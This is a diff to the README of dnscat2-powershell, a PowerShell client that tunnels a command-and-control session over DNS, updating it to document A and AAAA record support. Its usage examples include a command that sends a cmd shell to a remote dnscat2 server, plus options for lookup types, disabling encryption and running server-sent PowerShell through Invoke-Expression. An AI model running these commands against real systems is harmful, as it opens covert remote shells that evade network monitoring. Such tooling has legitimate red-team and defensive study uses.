@@ -22,8 +22,8 @@ Start-Dnscat2 is the actual function used as the client. Specifiy the dnscat2 se
     Send a cmd shell, and send DNS requests to the default DNS Server set in Windows:
         Start-Dnscat2 -Domain <dnscat2 server> -Exec cmd
 
-    Start a console session. Only use CNAME and MX requests:
-        Start-Dnscat2 -Domain <dnscat2 server> -LookupTypes @("CNAME","MX") -Console
+    Start a console session. Only use CNAME, MX, and AAAA requests:
+        Start-Dnscat2 -Domain <dnscat2 server> -LookupTypes @("CNAME","MX","AAAA") -Console
 
     Do not encrypt the session. Encryption is enabled by default.
         Start-Dnscat2 -Domain <dnscat2 server> -NoEncryption
@@ -56,7 +56,8 @@ The client can handle normal dnscat2 commands, or the *powershell version* of th
     -PreSharedSecret          Set the same secret on the server to authenticate and prevent MITM.
     -NoEncryption             Do not use encryption.
     
-    -LookupTypes <String[]>   Set an array of lookup types to randomly switch between. Default: @(TXT, MX, CNAME)
+    -LookupTypes <String[]>   Set an array of lookup types to randomly switch between.
+                              Only TXT, MX, CNAME, A, and AAAA records are supported. Default: @(TXT, MX, CNAME)
     -Delay <Int32>            Set a delay between each request, in milliseconds. (Default: 0)
     -MaxPacketSize <Int32>    Maximum length of a dnscat2 packet. (Default: 240)
     -Name <String>            The name of your dnscat2 session. (Default: hostname)
@@ -64,6 +65,3 @@ The client can handle normal dnscat2 commands, or the *powershell version* of th
 ### ExecPS and 'exec psh'
 
 dnscat2-powershell simulates a powershell session by passing data from the server to Invoke-Expression. Only stdout is returned, and variables are preserved as long as the client is running. **Watch out** for things that exit powershell like "exit" and "break", because the entire dnscat2-powershell client will exit, not just the ExecPS session.
-
-### Currently Unsupported Features
-    A and AAAA requests are not supported
